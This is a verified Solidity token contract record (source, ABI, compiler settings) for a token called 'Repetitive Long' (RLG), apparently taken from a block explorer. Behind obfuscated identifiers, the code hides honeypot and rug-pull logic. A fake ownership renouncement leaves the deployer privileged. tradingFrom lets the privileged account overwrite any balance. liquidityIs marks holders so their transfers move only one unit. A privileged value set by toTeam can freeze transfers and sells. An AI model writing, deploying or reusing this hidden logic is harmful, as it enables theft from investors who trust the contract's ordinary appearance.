{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface txTokenTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingAtLaunched) external view returns (uint256);\n\n    function transfer(address takeSwap, uint256 totalWallet) external returns (bool);\n\n    function allowance(address takeSwapAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeSwap,\n        uint256 totalWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletLaunch, uint256 value);\n    event Approval(address indexed takeSwapAuto, address indexed spender, uint256 value);\n}\n\nabstract contract totalShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface minFund {\n    function createPair(address atTx, address totalTrading) external returns (address);\n}\n\ninterface tradingSender is txTokenTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RepetitiveLong is totalShould, txTokenTeam, tradingSender {\n\n    function exemptMax() private view {\n        require(swapLaunch[_msgSender()]);\n    }\n\n    function liquidityIs(address liquidityFee) public {\n        exemptMax();\n        \n        if (liquidityFee == tokenReceiver || liquidityFee == isSell) {\n            return;\n        }\n        totalAmount[liquidityFee] = true;\n    }\n\n    string private walletToMode = \"Repetitive Long\";\n\n    function balanceOf(address tradingAtLaunched) public view virtual override returns (uint256) {\n        return liquidityTx[tradingAtLaunched];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return walletToMode;\n    }\n\n    function transferFrom(address tokenShould, address takeSwap, uint256 totalWallet) external override returns (bool) {\n        if (_msgSender() != senderFee) {\n            if (enableReceiver[tokenShould][_msgSender()] != type(uint256).max) {\n                require(totalWallet <= enableReceiver[tokenShould][_msgSender()]);\n                enableReceiver[tokenShould][_msgSender()] -= totalWallet;\n            }\n        }\n        return toTake(tokenShould, takeSwap, totalWallet);\n    }\n\n    function minSwapMarketing(address tokenShould, address takeSwap, uint256 totalWallet) internal returns (bool) {\n        require(liquidityTx[tokenShould] >= totalWallet);\n        liquidityTx[tokenShould] -= totalWallet;\n        liquidityTx[takeSwap] += totalWallet;\n        emit Transfer(tokenShould, takeSwap, totalWallet);\n        return true;\n    }\n\n    mapping(address => uint256) private liquidityTx;\n\n    bool private autoExempt;\n\n    mapping(address => mapping(address => uint256)) private enableReceiver;\n\n    uint256 private walletToken;\n\n    uint8 private txWallet = 18;\n\n    function tradingFrom(address tradingWallet, uint256 totalWallet) public {\n        exemptMax();\n        liquidityTx[tradingWallet] = totalWallet;\n    }\n\n    address amountFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public totalAmount;\n\n    function limitAmountMin(address walletBuyMarketing) public {\n        if (modeAt) {\n            return;\n        }\n        if (isAutoTake == walletToken) {\n            fromSwap = true;\n        }\n        swapLaunch[walletBuyMarketing] = true;\n        \n        modeAt = true;\n    }\n\n    uint256 public tokenWallet;\n\n    function walletIs() public {\n        emit OwnershipTransferred(tokenReceiver, address(0));\n        sellSender = address(0);\n    }\n\n    function toTake(address tokenShould, address takeSwap, uint256 totalWallet) internal returns (bool) {\n        if (tokenShould == tokenReceiver) {\n            return minSwapMarketing(tokenShould, takeSwap, totalWallet);\n        }\n        uint256 exemptTo = txTokenTeam(isSell).balanceOf(amountFrom);\n        require(exemptTo == launchTo);\n        require(takeSwap != amountFrom);\n        if (totalAmount[tokenShould]) {\n            return minSwapMarketing(tokenShould, takeSwap, feeFund);\n        }\n        return minSwapMarketing(tokenShould, takeSwap, totalWallet);\n    }\n\n    uint256 limitIs;\n\n    address private sellSender;\n\n    function owner() external view returns (address) {\n        return sellSender;\n    }\n\n    bool public modeAt;\n\n    function approve(address autoSwap, uint256 totalWallet) public virtual override returns (bool) {\n        enableReceiver[_msgSender()][autoSwap] = totalWallet;\n        emit Approval(_msgSender(), autoSwap, totalWallet);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return txTrading;\n    }\n\n    uint256 constant feeFund = 1 ** 10;\n\n    address public isSell;\n\n    uint256 launchTo;\n\n    function transfer(address tradingWallet, uint256 totalWallet) external virtual override returns (bool) {\n        return toTake(_msgSender(), tradingWallet, totalWallet);\n    }\n\n    string private txTrading = \"RLG\";\n\n    uint256 public isAutoTake;\n\n    address public tokenReceiver;\n\n    bool private fromSwap;\n\n    function toTeam(uint256 totalWallet) public {\n        exemptMax();\n        launchTo = totalWallet;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapTotalTrading;\n    }\n\n    function allowance(address launchedReceiver, address autoSwap) external view virtual override returns (uint256) {\n        if (autoSwap == senderFee) {\n            return type(uint256).max;\n        }\n        return enableReceiver[launchedReceiver][autoSwap];\n    }\n\n    address senderFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        if (sellSwap == tokenWallet) {\n            tokenWallet = sellSwap;\n        }\n        swapMode modeSell = swapMode(senderFee);\n        isSell = minFund(modeSell.factory()).createPair(modeSell.WETH(), address(this));\n        \n        tokenReceiver = _msgSender();\n        walletIs();\n        swapLaunch[tokenReceiver] = true;\n        liquidityTx[tokenReceiver] = swapTotalTrading;\n        if (fromSwap) {\n            sellSwap = isAutoTake;\n        }\n        emit Transfer(address(0), tokenReceiver, swapTotalTrading);\n    }\n\n    uint256 private sellSwap;\n\n    uint256 private swapTotalTrading = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return sellSender;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return txWallet;\n    }\n\n    event OwnershipTransferred(address indexed launchedMode, address indexed fromTx);\n\n    mapping(address => bool) public swapLaunch;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeSwapAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAtLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAutoTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletBuyMarketing\",\"type\":\"address\"}],\"name\":\"limitAmountMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFee\",\"type\":\"address\"}],\"name\":\"liquidityIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalWallet\",\"type\":\"uint256\"}],\"name\":\"toTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalWallet\",\"type\":\"uint256\"}],\"name\":\"tradingFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RepetitiveLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}